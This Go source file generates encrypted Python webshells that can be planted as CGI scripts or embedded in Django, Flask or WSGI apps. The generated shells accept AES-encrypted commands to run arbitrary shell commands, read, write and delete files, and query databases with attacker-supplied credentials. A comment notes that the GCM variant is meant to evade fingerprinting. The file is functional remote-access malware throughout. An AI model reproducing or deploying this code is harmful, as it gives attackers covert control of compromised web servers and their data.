package webshell

import "strings"

// ─── Python Shell 代码生成 ────────────────────────────────────────────────────
//
// Python shell 与 JSP/ASPX 使用相同的「行协议」（AES-128-ECB + base64 + action\narg...）
// 因此 Go 侧复用 jspSend / jspDBQuery 等方法，仅 shellType 标记为 "python"。
//
// 部署场景：
//   - CGI 脚本  : 放在 /cgi-bin/ 目录，Apache/Nginx 需开启 CGI 模块
//   - Django 视图: 将 Page_Load 逻辑嵌入 view 函数
//   - Flask 路由 : 嵌入 route handler
//   - 任意 WSGI : 解包 environ['wsgi.input'] 即可

// ShellCodePython 返回指定协议的 Python shell 代码。
// 目前仅支持 default_aes（AES-128-ECB），其他协议回落到 default_aes。
func ShellCodePython(password, protocol string) string {
	key16 := deriveKey(password)
	switch protocol {
	case "default_aes", "":
		return pythonShellCGI(key16)
	case "aes_gcm":
		return pythonShellGCM(key16)
	default:
		return pythonShellCGI(key16)
	}
}

// pythonShellCGI 生成 CGI 兼容的 Python3 Webshell（AES-128-ECB 行协议）。
// 密码派生：key = MD5(password)[0:16]（与 AEGIS PHP/JSP 协议一致）。
// 自动尝试 pycryptodome → cryptography 两种 AES 库，均不可用则返回错误。
func pythonShellCGI(key16 string) string {
	return strings.ReplaceAll(`#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys,os,base64,json,subprocess,hashlib,stat
print("Content-Type: text/plain\r\n\r",end="",flush=True)

_K=b"«KEY»"

def _dec(data):
    try:
        from Crypto.Cipher import AES;from Crypto.Util.Padding import unpad
        return unpad(AES.new(_K,AES.MODE_ECB).decrypt(data),16)
    except ImportError:pass
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
        from cryptography.hazmat.primitives import padding as _p
        d=Cipher(algorithms.AES(_K),modes.ECB()).decryptor()
        raw=d.update(data)+d.finalize()
        u=_p.PKCS7(128).unpadder();return u.update(raw)+u.finalize()
    except ImportError:pass
    raise RuntimeError("no AES lib: pip install pycryptodome")

def _r(s):
    b=s.encode() if isinstance(s,str) else s
    return json.dumps({"status":"200","msg":base64.b64encode(b).decode()})

def _b(s):return base64.b64decode(s.strip() if isinstance(s,str) else s)
def _bs(s):return _b(s).decode("utf-8","replace") if s else ""
def _p(parts,n):return _bs(parts[n]) if len(parts)>n and parts[n].strip() else ""
def _pb(parts,n):return _b(parts[n]) if len(parts)>n and parts[n].strip() else b""

try:
    length=int(os.environ.get("CONTENT_LENGTH",0) or 0)
    body=sys.stdin.buffer.read(length) if length else b""
    if not body.strip():print(_r("hello"));sys.exit(0)
    plain=_dec(_b(body.strip())).decode("utf-8")
    parts=plain.split("\n");a=parts[0].strip() if parts else ""

    if a=="info":
        import platform,socket
        i={"os":platform.system()+" "+platform.release(),"server":os.environ.get("SERVER_SOFTWARE","CGI/Python"),
           "php":"Python "+sys.version.split()[0],"cwd":os.getcwd(),
           "user":os.environ.get("USER",os.environ.get("USERNAME","")),"hostname":socket.gethostname(),
           "ip":os.environ.get("SERVER_ADDR",os.environ.get("LOCAL_ADDR",""))}
        print(_r(json.dumps(i)))
    elif a=="exec":
        cmd=_p(parts,1)
        try:
            r2=subprocess.run(cmd,shell=True,capture_output=True,timeout=30)
            print(_r((r2.stdout+r2.stderr).decode("utf-8","replace")))
        except Exception as e:print(_r(str(e)))
    elif a=="ls":
        path=_p(parts,1);items=[]
        for nm in os.listdir(path):
            fp=os.path.join(path,nm)
            try:
                s=os.stat(fp)
                items.append({"name":nm,"isDir":os.path.isdir(fp),"size":s.st_size,
                              "mtime":int(s.st_mtime),"perms":oct(stat.S_IMODE(s.st_mode))})
            except:pass
        print(_r(json.dumps(items)))
    elif a=="read":
        path=_p(parts,1)
        with open(path,"rb") as f:data=f.read()
        print(_r(base64.b64encode(data).decode()))
    elif a=="write":
        path,data=_p(parts,1),_pb(parts,2)
        with open(path,"wb") as f:f.write(data)
        print(_r("ok"))
    elif a=="append":
        path,data=_p(parts,1),_pb(parts,2)
        with open(path,"ab") as f:f.write(data)
        print(_r("ok"))
    elif a=="delete":
        import shutil;path=_p(parts,1)
        if os.path.isdir(path):shutil.rmtree(path)
        else:os.remove(path)
        print(_r("ok"))
    elif a=="mkdir":
        os.makedirs(_p(parts,1),exist_ok=True);print(_r("ok"))
    elif a=="rename":
        os.rename(_p(parts,1),_p(parts,2));print(_r("ok"))
    elif a=="hash":
        path=_p(parts,1)
        with open(path,"rb") as f:h=hashlib.md5(f.read()).hexdigest()
        print(_r(h))
    elif a=="createfile":
        path=_p(parts,1)
        if not os.path.exists(path):open(path,"w").close()
        print(_r("ok"))
    elif a=="exists":
        print(_r("1" if os.path.exists(_p(parts,1)) else "0"))
    elif a=="db_query":
        tp,h2,po,db2,us,pw,sq=_p(parts,1),_p(parts,2),_p(parts,3),_p(parts,4),_p(parts,5),_p(parts,6),_p(parts,7)
        try:
            import importlib
            if tp in("mysql","mariadb"):
                m=importlib.import_module("mysql.connector")
                cn=m.connect(host=h2,port=int(po or 3306),user=us,password=pw,database=db2)
            elif tp=="postgresql":
                m=importlib.import_module("psycopg2")
                cn=m.connect(host=h2,port=int(po or 5432),user=us,password=pw,dbname=db2)
            elif tp in("mssql","sqlserver"):
                m=importlib.import_module("pymssql")
                cn=m.connect(server=h2+":"+str(po or 1433),user=us,password=pw,database=db2)
            elif tp=="sqlite":
                import sqlite3;cn=sqlite3.connect(db2)
            elif tp=="oracle":
                m=importlib.import_module("cx_Oracle")
                cn=m.connect(us,pw,h2+":"+str(po or 1521)+"/"+db2)
            else:raise Exception("unsupported db: "+tp)
            cur=cn.cursor();cur.execute(sq)
            if cur.description:
                hdrs=[d[0] for d in cur.description]
                rows=[[str(v) if v is not None else None for v in row] for row in cur.fetchall()]
                print(_r(json.dumps({"headers":hdrs,"rows":rows})))
            else:
                print(_r(json.dumps({"headers":["affected_rows"],"rows":[[str(cur.rowcount)]]})))
            cn.close()
        except Exception as e:print(_r(json.dumps({"error":str(e),"headers":[],"rows":[]})))
    else:
        print(_r("unknown:"+a))
except Exception as e:
    print(json.dumps({"status":"500","msg":base64.b64encode(str(e).encode()).decode()}))
`, "«KEY»", key16)
}

// pythonShellGCM 生成 AES-256-GCM 协议的 Python shell（更强加密，防 ECB 模式指纹）。
// nonce（12字节）+ 密文 + tag（16字节）整体 base64 传输。
func pythonShellGCM(key16 string) string {
	key32 := key16 + key16 // 32字节：与 Go 侧 deriveKey32 一致
	return strings.ReplaceAll(`#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys,os,base64,json,subprocess,hashlib,stat
print("Content-Type: text/plain\r\n\r",end="",flush=True)

_K=b"«KEY32»"

def _dec(data):
    raw=base64.b64decode(data.strip() if isinstance(data,str) else data)
    nonce,ct,tag=raw[:12],raw[12:-16],raw[-16:]
    try:
        from Crypto.Cipher import AES
        c=AES.new(_K,AES.MODE_GCM,nonce=nonce);return c.decrypt_and_verify(ct,tag)
    except ImportError:pass
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    return AESGCM(_K).decrypt(nonce,ct+tag,None)

def _r(s):
    b=s.encode() if isinstance(s,str) else s
    return json.dumps({"status":"200","msg":base64.b64encode(b).decode()})

def _bs(s):return base64.b64decode(s.strip() if isinstance(s,str) else s).decode("utf-8","replace") if s else ""
def _pb(s):return base64.b64decode(s.strip() if isinstance(s,str) else s) if s else b""
def _p(parts,n):return _bs(parts[n]) if len(parts)>n and parts[n].strip() else ""
def _pb2(parts,n):return _pb(parts[n]) if len(parts)>n and parts[n].strip() else b""

try:
    length=int(os.environ.get("CONTENT_LENGTH",0) or 0)
    body=sys.stdin.buffer.read(length) if length else b""
    if not body.strip():print(_r("hello"));sys.exit(0)
    plain=_dec(body.strip()).decode("utf-8")
    parts=plain.split("\n");a=parts[0].strip() if parts else ""

    if a=="info":
        import platform,socket
        i={"os":platform.system()+" "+platform.release(),"server":os.environ.get("SERVER_SOFTWARE","CGI/Python"),
           "php":"Python "+sys.version.split()[0],"cwd":os.getcwd(),
           "user":os.environ.get("USER",os.environ.get("USERNAME","")),"hostname":socket.gethostname(),
           "ip":os.environ.get("SERVER_ADDR","")}
        print(_r(json.dumps(i)))
    elif a=="exec":
        r2=subprocess.run(_p(parts,1),shell=True,capture_output=True,timeout=30)
        print(_r((r2.stdout+r2.stderr).decode("utf-8","replace")))
    elif a=="ls":
        path=_p(parts,1);items=[]
        for nm in os.listdir(path):
            fp=os.path.join(path,nm)
            try:s=os.stat(fp);items.append({"name":nm,"isDir":os.path.isdir(fp),"size":s.st_size,"mtime":int(s.st_mtime),"perms":oct(stat.S_IMODE(s.st_mode))})
            except:pass
        print(_r(json.dumps(items)))
    elif a=="read":
        with open(_p(parts,1),"rb") as f:print(_r(base64.b64encode(f.read()).decode()))
    elif a=="write":
        with open(_p(parts,1),"wb") as f:f.write(_pb2(parts,2))
        print(_r("ok"))
    elif a=="delete":
        import shutil;path=_p(parts,1)
        if os.path.isdir(path):shutil.rmtree(path)
        else:os.remove(path)
        print(_r("ok"))
    elif a=="mkdir":
        os.makedirs(_p(parts,1),exist_ok=True);print(_r("ok"))
    elif a=="rename":
        os.rename(_p(parts,1),_p(parts,2));print(_r("ok"))
    elif a=="hash":
        with open(_p(parts,1),"rb") as f:print(_r(hashlib.md5(f.read()).hexdigest()))
    elif a=="exists":
        print(_r("1" if os.path.exists(_p(parts,1)) else "0"))
    else:
        print(_r("unknown:"+a))
except Exception as e:
    print(json.dumps({"status":"500","msg":base64.b64encode(str(e).encode()).decode()}))
`, "«KEY32»", key32)
}
